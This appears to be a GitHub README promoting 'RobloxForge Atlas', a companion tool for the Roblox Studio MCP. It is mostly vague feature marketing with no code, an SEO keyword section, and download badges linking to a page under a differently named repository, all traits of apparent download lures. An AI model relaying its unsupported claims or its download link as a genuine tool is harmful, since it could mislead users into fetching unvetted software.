![preview](https://raw.githubusercontent.com/AallamR/RobloxForge-Intelligence/main/banner_0eeb7.svg)
[![Download](https://raw.githubusercontent.com/AallamR/RobloxForge-Intelligence/main/run_012b5.svg)](https://AallamR.github.io/RobloxForge-Intelligence/)

# RobloxForge Atlas 🧭

**The Cartographer’s Desk for Roblox Studio’s Model Context Protocol**

A companion intelligence layer that turns the official Roblox Studio MCP from a raw pipe into a well-lit workshop. Atlas maps every context window, every tool call, every verification receipt into a navigable terrain, so builders stop guessing which slice of reality the model is actually seeing.

---

## 🧩 What Is This, Really?

Imagine the official MCP as a sprawling, powerful railway network. Tracks exist, signals exist, and engines are running. But there is no timetable, no station map, no conductor’s log. RobloxForge Atlas is the timetable, the station map, and the conductor’s log — bound together, cross-referenced, and printed on paper that doesn’t smudge when the model hallucinates a junction that was never built.

Atlas is not a fork of the official MCP. It is not a wrapper that hides the original. It is a **vertical-slice discipline engine**: a layer that insists every generation be scoped to a single, verifiable, demonstrable slice of work — then proves it happened with a receipt no one can argue with.

Where the original context described “current official docs, vertical-slice discipline, verification receipts,” Atlas takes those three pillars and grows an entire observatory on top of them.

---

## 🗺️ The Atlas Difference: From Pipeline to Panorama

Most MCP tooling treats the protocol as a plumbing problem. Connect, stream, done. Atlas treats it as a **cartography problem**. Every tool has a territory. Every response has a border. Every generation has a latitude and longitude inside the project’s history.

Key philosophical shifts:

- **Slices over swamps.** Instead of letting a model wander across an entire place file, Atlas enforces vertical slices — one feature, one system, one behavior at a time, each slice independently reviewable.
- **Receipts over vibes.** A generation is not “done” because it looks right. It is done when a verification receipt is issued, timestamped, and attached to the slice.
- **Maps over memories.** The model’s context window is ephemeral. Atlas’s terrain map is persistent, queryable, and version-controlled alongside your project.

---

## 🎯 Feature Constellation

### 🧠 Context Intelligence Layer
Atlas continuously samples the live context handed to the official MCP and renders it as a heat map. You see which folders, scripts, and instances the model actually read — not what you hoped it read. This single feature eliminates the most common source of “but I told it to look at the module” frustration.

### 🧱 Vertical Slice Enforcement
Define a slice with a name, a boundary, and an exit condition. Atlas refuses to close the slice until the exit condition is proven. No more sprawling changes that touch 47 scripts because the model got enthusiastic.

### 🧾 Verification Receipts
Every slice produces a receipt: a compact, portable record of what changed, what was tested in Studio, and what the observed outcome was. Receipts are chainable, so a sequence of slices forms an audit trail that reads like a build log written by someone who actually cares.

### 🌐 Responsive Multi-Pane Workspace
The Atlas desktop surface rearranges itself based on which phase you are in: scoping, generating, verifying, or reviewing. Panes collapse when idle and expand when a slice is active. It feels less like an IDE and more like a cockpit that knows which instruments matter right now.

### 🗣️ Multilingual Slice Notes
Write slice descriptions and receipt annotations in your own language. Atlas normalizes them internally so teammates across regions can read the same audit trail without a translation round-trip. Supported locales include but are not limited to English, Japanese, Korean, Spanish, Portuguese, German, and French.

### 🕰️ 24/7 Slice Sentinel
A background sentinel watches for slice drift — the slow, creeping expansion of scope that ruins otherwise clean generations. It nudges, flags, and if configured, pauses the slice until a human acknowledges the drift. The sentinel does not sleep, because scope creep does not sleep.

### 🔍 Receipt Search and Replay
Search receipts by slice name, date, script path, or outcome keyword. Replay a receipt to see the exact context Atlas presented to the model at that moment. This is time travel for debugging.

### 🧬 Protocol-Native, Not Protocol-Breaking
Atlas speaks the official MCP dialect. It does not shim, spoof, or intercept in ways that break compatibility. When the official protocol evolves, Atlas evolves with it, because Atlas treats the official docs as the source of truth — and treats itself as the lens, not the light.

### 📦 Offline Slice Bundling
Export a slice and its receipts as a self-contained bundle that a teammate can import without network access. Bundles are signed, diffable, and small enough to attach to a review comment.

### 🎛️ Configurable Strictness Profiles
Choose how aggressively Atlas enforces slices: Gentle (nudges only), Standard (blocks slice closure without receipt), or Forensic (blocks any file write outside the declared slice boundary). Each profile is documented and reversible.

---

## 🛠️ How Atlas Fits Into a Real Workflow

A typical afternoon with Atlas looks like this:

1. **Scope.** You open the Atlas workspace and declare a slice: “Add stamina drain to sprint system.” The slice gets a boundary — the sprint controller script, the stamina module, and the HUD element that reflects stamina.
2. **Generate.** The official MCP does its work. Atlas watches the context window and flags the moment the model tries to read a file outside the boundary. You approve or reject the expansion.
3. **Verify.** You run the slice exit condition in Studio — in this case, “sprint for 10 seconds, stamina reaches zero, speed returns to walk.” Atlas records the observed outcome.
4. **Receipt.** Atlas issues a receipt with the slice name, boundary, changed files, test observation, and a hash of the context window at generation time.
5. **Review.** A teammate opens the receipt, replays the context, and sees exactly what you saw. No guesswork, no “works on my machine.”

The entire loop is designed so that the model’s intelligence is amplified, not trusted blindly.

---

## 🧭 Who Atlas Is For

- **Solo builders** who want their future self to understand what past self was thinking.
- **Small teams** who need a shared language for “what changed and why.”
- **Tooling tinkerers** who want to extend the official MCP without forking it into oblivion.
- **Educators** who teach Roblox development and want students to learn disciplined iteration instead of chaotic generation.
- **Reviewers** who are tired of reading diffs without context.

Atlas assumes you already know your way around Roblox Studio. It does not teach Luau. It teaches discipline.

---

## 📐 Architecture at a Glance

Atlas is organized into four cooperating layers, each replaceable without disturbing the others:

- **Ingest Layer.** Connects to the official MCP endpoint and samples context at a configurable cadence. Normalizes the sample into Atlas’s internal terrain format.
- **Slice Engine.** Holds slice definitions, boundaries, and exit conditions. Emits events when drift is detected or when a slice is ready for verification.
- **Receipt Foundry.** Builds, signs, indexes, and replays receipts. Exposes a query interface for search and audit.
- **Surface Layer.** The responsive multi-pane workspace. Renders terrain maps, slice timelines, receipt lists, and sentinel alerts.

Each layer communicates through a documented internal contract, which means you can swap the Surface Layer for a CLI, a web dashboard, or a voice interface without touching the Slice Engine.

---

## 🔐 Verification Receipts in Detail

A receipt is not a log line. It is a structured artifact with a defined schema. At minimum, a receipt contains:

- Slice identifier and human-readable name
- Declared boundary (files, instances, or both)
- Actual boundary touched during generation
- Exit condition text and observed outcome
- Context window fingerprint at generation time
- Timestamp in ISO 8601, always in UTC
- Author identifier (local, never transmitted unless you export)
- Optional annotations in any supported locale

Receipts are immutable once issued. Corrections are issued as new receipts that reference the original, forming a chain rather than a rewrite. This is how Atlas maintains trust without pretending mistakes never happen.

---

## 🌍 Multilingual Support, Done Thoughtfully

Atlas does not machine-translate your slice notes behind your back. Instead, it stores notes in their original language and provides a parallel field for optional translations. The audit trail preserves the original wording, because nuance matters when you are debugging a subtle behavioral bug at 2 a.m.

Interface strings are available in multiple locales, and the locale can be changed without restarting the workspace.

---

## 🧑‍💻 Responsive UI Philosophy

The Atlas workspace is built on a simple belief: **the tool should recede when you are thinking and appear when you are deciding.** Panes that are not relevant to the current phase fade to a quiet sidebar. When a sentinel alert fires, the relevant pane expands into focus. When a receipt is issued, the receipt pane briefly takes center stage, then steps back.

This is not animation for its own sake. It is attention management.

---

## 🛎️ 24/7 Slice Sentinel and Support

The Sentinel runs continuously while Atlas is active. It watches for:

- Boundary violations
- Exit conditions that were declared but never verified
- Receipts that reference missing files
- Slices that have been open longer than a configurable threshold

For human support, Atlas includes a built-in help surface with contextual guidance. The support channel is designed to respond around the clock, because Roblox builders work in every time zone and inspiration does not check a clock.

---

## 🧪 Testing and Verification Culture

Atlas is built with the same discipline it enforces. Every internal component has a slice definition, an exit condition, and a receipt. The repository’s own history is a demonstration of the methodology. If you want to understand how Atlas works, read its receipts — they are part of the documentation.

---

## 🧰 Configuration Without Ceremony

Atlas reads a single configuration file at the project root. The file is plain text, human-editable, and version-controllable. It declares:

- Strictness profile
- Sentinel thresholds
- Supported locales
- Receipt signing preferences
- Surface layout defaults

No hidden state. No opaque database. If you delete the config, Atlas regenerates a sensible default and tells you what it did.

---

## 🧭 Roadmap Themes

- **Terrain Diffing.** Visualize how the model’s context map changed between two slices.
- **Receipt Federation.** Share receipts across projects without sharing project files.
- **Sentinel Policies.** User-defined drift rules beyond the built-in defaults.
- **Slice Templates.** Reusable slice definitions for common Roblox systems.
- **Surface Plugins.** A documented plugin API for custom panes.

Roadmap items are themes, not promises. Atlas evolves at the pace of careful slicing.

---

## 🧾 License

This project is released under the MIT License. The full license text is available at the link below.

[MIT License](https://opensource.org/licenses/MIT)

Copyright (c) 2026 RobloxForge Atlas Contributors

Permission is hereby granted, in perpetuity, to any person obtaining a copy of this software and associated documentation files, to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the conditions of the MIT License.

---

## ⚠️ Disclaimer

RobloxForge Atlas is an independent companion tool. It is not affiliated with, endorsed by, or officially connected to Roblox Corporation or the official Roblox Studio MCP team. “Roblox” and “Roblox Studio” are trademarks of their respective owners.

Atlas does not modify, patch, or bypass the official MCP. It observes, maps, and records. Any behavior that appears magical is simply the result of disciplined scoping and honest receipts.

The software is provided “as is,” without warranty of any kind, express or implied. Use it at your own discretion, and always verify slices in a safe environment before applying changes to a production place.

---

## 🧭 SEO-Friendly Topics Atlas Naturally Touches

Roblox Studio MCP companion tool, vertical slice discipline for Roblox, verification receipts for AI-generated code, context window mapping for Roblox, Roblox development workflow intelligence, multi-pane Roblox tooling, slice sentinel for scope creep, multilingual Roblox build logs, receipt replay for debugging, protocol-native MCP extension, RobloxForge Atlas, disciplined AI-assisted Roblox development, 2026 Roblox tooling, responsive workspace for Roblox builders, 24/7 slice monitoring.

---

## 🧩 Final Thought

The official MCP gives you a powerful engine. Atlas gives you a map, a conductor’s log, and a receipt for every mile traveled. Build boldly, but build with a record of where you have been — because the next slice always starts from the last receipt.

[![Download](https://raw.githubusercontent.com/AallamR/RobloxForge-Intelligence/main/run_012b5.svg)](https://AallamR.github.io/RobloxForge-Intelligence/)